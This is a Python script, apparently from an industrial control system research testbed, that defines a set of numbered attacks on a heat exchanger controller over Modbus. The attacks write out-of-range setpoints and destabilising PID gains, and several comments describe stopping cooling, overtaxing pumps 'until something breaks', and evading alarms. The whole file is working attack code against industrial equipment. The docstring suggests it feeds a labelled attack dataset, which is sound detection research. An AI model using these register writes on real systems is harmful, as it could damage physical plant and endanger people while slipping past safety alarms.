#!/bin/python3

"""
Created on Tue Mar 10 15:43:48 2020

@author: Rishabh Das


Please include change_data_label(label) function call before doing each attack
This function call lets the data logger know that some kind of attack is
being performed on the system.

"""
import socket
import threading
import pickle
import time
from HeatExchangerModbusUtility import HeatExchangerModbusUtility

MODBUS_PKT_SIZE=55

class attack:

    def __init__(self, ip, port):
        self.he = HeatExchangerModbusUtility( ip )

    def Attack18( self ):
        # #18 -- Set the value of setpoint below 20C
        self.he.WriteRegister( "Setpoint", 10 )

    def Attack19( self ):
        # #19 -- Set the value of setpoint above 70C
        self.he.WriteRegister( "Setpoint", 80 )

    def Attack20( self ):
        # #20 -- Set the value of setpoint to 26C (acceptable value but will force a significantly higher workload)
        self.he.WriteRegister( "Setpoint", 26 )

    def Attack21( self ):
        # #21 -- Set the value of setpoint to zero (this disables all flow resulting in no cooling)
        self.he.WriteRegister( "Setpoint", 0 )

    def Attack22( self ):
        # #21 -- Set the value of pid_kp to 0.9 (rapid change in required flow rate while still remaining mostly-stable to avoid triggering alarms)
        self.he.WriteRegister( "PID_kp", 0.9 )

    def Attack23( self ):
        # #23 -- Set the value of pid_kp to 1.2 (unstable system forcing rapid change in flow rate, potentially overtaxing pumps until something breaks)
        self.he.WriteRegister( "PID_kp", 1.2 )

    def Attack24( self ):
        # #24 -- Set the value of pid_tr to 0 (forces max flow rate and produces lowest possible output temp all the time) 
        self.he.WriteRegister( "PID_tr", 0 )

    def Attack25( self ):
        # #25 -- Set the value of pid_tr to -0.1 (disables flow rate resulting in no change in temperature)
        self.he.WriteRegister( "PID_tr", -0.1 )

    def Attack26( self ):
        # #26 -- Set the value of pid_td to 0.5 (does nothing if system is already stable.  Will cause instability when set point is moved afterwards)
        self.he.WriteRegister( "PID_td", 0.5 )

if __name__=="__main__":
    attacker = attack( "192.168.56.104", "502" )
    attacker.he.PrintAllRegisters()
    while True:

        attacker.he.WriteRegister( "Setpoint", 70 )
